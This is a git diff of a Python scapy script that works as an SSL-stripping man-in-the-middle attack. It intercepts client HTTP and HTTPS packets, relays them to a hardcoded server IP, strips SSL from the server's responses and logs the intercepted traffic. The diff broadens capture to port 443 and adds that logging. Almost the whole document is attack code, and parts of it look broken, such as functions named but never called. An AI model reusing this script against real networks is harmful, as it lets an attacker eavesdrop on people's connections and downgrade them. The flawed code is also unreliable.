@@ -1,7 +1,7 @@
 import scapy.all as sc
 
 serverMac = ""
-serverIP = ""
+serverIP = "131.155.244.97"
 
 clientIP = ""
 clientMac = ""
@@ -13,52 +13,61 @@ sc.load_layer("http")
 
 def handle_packet(pkt):
     global clientIP, clientMac
-    print(f"HTTP request from client: {pkt.summary()}")
+    
     clientIP = pkt[sc.IP].src
     clientMac = pkt[sc.Ether].src
 
-    if pkt.haslayer(sc.IP) and pkt.haslayer(sc.TCP) and pkt.haslayer(sc.Raw):
-        ether = sc.Ether(src=attackerMac, dst=serverMac)
-        ip = sc.IP(src=attackerIP, dst=serverIP)
-        tcp = sc.TCP(
-            sport=pkt[sc.TCP].sport,
-            dport=pkt[sc.TCP].dport,
-            seq=pkt[sc.TCP].seq,
-            ack=pkt[sc.TCP].ack,
-            flags=pkt[sc.TCP].flags
-        )
+    if not pkt.haslayer(sc.IP) or not pkt.haslayer(sc.TCP) or not pkt[sc.IP].dst == attackerIP:
+        return
+    dstPort = pkt[sc.TCP].dport
+
+    if dstPort == 443:
+        print(f"HTTPS request from client: {pkt.summary()}")
+        forward_to_server(pkt)
+        forwarding
+    if dstPort == 80:
+        print(f"HTTP request from client: {pkt.summary()}")
+        log_packet("client -> server", pkt)
+   
+    ether = sc.Ether(src=attackerMac, dst=serverMac)
+    ip = sc.IP(src=attackerIP, dst=serverIP)
+    tcp = sc.TCP(
+        sport=pkt[sc.TCP].sport,
+        dport=pkt[sc.TCP].dport,
+        seq=pkt[sc.TCP].seq,
+        ack=pkt[sc.TCP].ack,
+        flags=pkt[sc.TCP].flags
+    )
+    if pkt.haslayer(sc.Raw):
         raw = sc.Raw(load=pkt[sc.Raw].load)
         forward_pkt = ether / ip / tcp / raw
-        sc.sendp(forward_pkt, iface=sc.conf.iface, verbose=False)
-        pkt = sc.sniff(filter=f"tcp and src host {serverIP} and dst port 80", store=False)
-        if (is_rst(pkt)):
-            forward_to_client(pkt)
-            return
-        else:
-            resp_ssl_strip(pkt)
-        ack = sc.sniff(lfilter=is_server_ack, count=1, timeout=5)
-        print(f"HTTP ACK from server: {ack.summary()}")
-        while (True):
-            nxt_pkt = sc.sniff(filter="http")
-            if (nxt_pkt[sc.IP].src == clientIP):
-                forward_to_server(nxt_pkt)
-                if (is_rst(nxt_pkt) or is_tcp_fin(nxt_pkt)):
-                    return
-            if (nxt_pkt[sc.IP].src == serverIP):
-                forward_to_client(nxt_pkt)
-                if (is_rst(nxt_pkt) or is_tcp_fin(nxt_pkt)):
-                    return
-            
+    else:
+        forward_pkt = ether / ip / tcp
+    sc.sendp(forward_pkt, iface=sc.conf.iface, verbose=False)
+    pkt = sc.sniff(filter=f"tcp and src host {serverIP} and dst port 80", store=False)
+    log_packet("server -> client", pkt)
+    if (is_rst(pkt)):
+        forward_to_client(pkt)
+        return
+    else:
+        resp_ssl_strip(pkt)
+    ack = sc.sniff(lfilter=is_server_ack, count=1, timeout=5)
+    print(f"HTTP ACK from server: {ack.summary()}")
+    log_packet("server -> client", pkt)
+    forwarding
 
-        
+def forwarding():
+    while (True):
+        nxt_pkt = sc.sniff(filter="http")
+        if (nxt_pkt[sc.IP].src == clientIP):
+            forward_to_server(nxt_pkt)
+            if (is_rst(nxt_pkt) or is_tcp_fin(nxt_pkt)):
+                return
+        if (nxt_pkt[sc.IP].src == serverIP):
+            forward_to_client(nxt_pkt)
+            if (is_rst(nxt_pkt) or is_tcp_fin(nxt_pkt)):
+                return
 
-
-def filter_get_requests(pkt):
-    return (
-        pkt.haslayer(sc.HTTPRequest) and
-        pkt[sc.HTTPRequest].Method == b'GET' and
-        sc.IP in pkt and pkt[sc.IP].dst == attackerIP
-    )
 
 def filter_response(pkt):
     return (
@@ -125,9 +134,13 @@ def forward_to_client(pkt):
         ack=pkt[sc.TCP].ack,
         flags=pkt[sc.TCP].flags
     )
-    raw = sc.Raw(load=pkt[sc.Raw].load)
-    new_pkt = ether / ip / tcp / raw
+    if pkt.haslayer(sc.Raw):
+        raw = sc.Raw(load=pkt[sc.Raw].load)
+        new_pkt = ether / ip / tcp / raw
+    else:
+        new_pkt = ether / ip / tcp
     sc.sendp(new_pkt, iface=sc.conf.iface, verbose=False)
+    log_packet("server -> client", pkt)
 
 
 def forward_to_server(pkt):
@@ -140,10 +153,18 @@ def forward_to_server(pkt):
         ack=pkt[sc.TCP].ack,
         flags=pkt[sc.TCP].flags
     )
-    raw = sc.Raw(load=pkt[sc.Raw].load)
-    new_pkt = ether / ip / tcp / raw
+    if pkt.haslayer(sc.Raw):
+        raw = sc.Raw(load=pkt[sc.Raw].load)
+        new_pkt = ether / ip / tcp / raw
+    else:
+        new_pkt = ether / ip / tcp
     sc.sendp(new_pkt, iface=sc.conf.iface, verbose=False)
+    log_packet("client -> server", pkt)
+
+def log_packet(direction, pkt):
+    with open("packet_log.txt", "a") as log_file:
+        log_file.write(f"[{direction}] {pkt.summary()}\n")
 
 
 while True:
-    sc.sniff(filter="tcp port 80", prn=handle_packet, lfilter=filter_get_requests, store=False)
+    sc.sniff(filter="tcp port 80 or tcp port 443", prn=handle_packet, store=False)
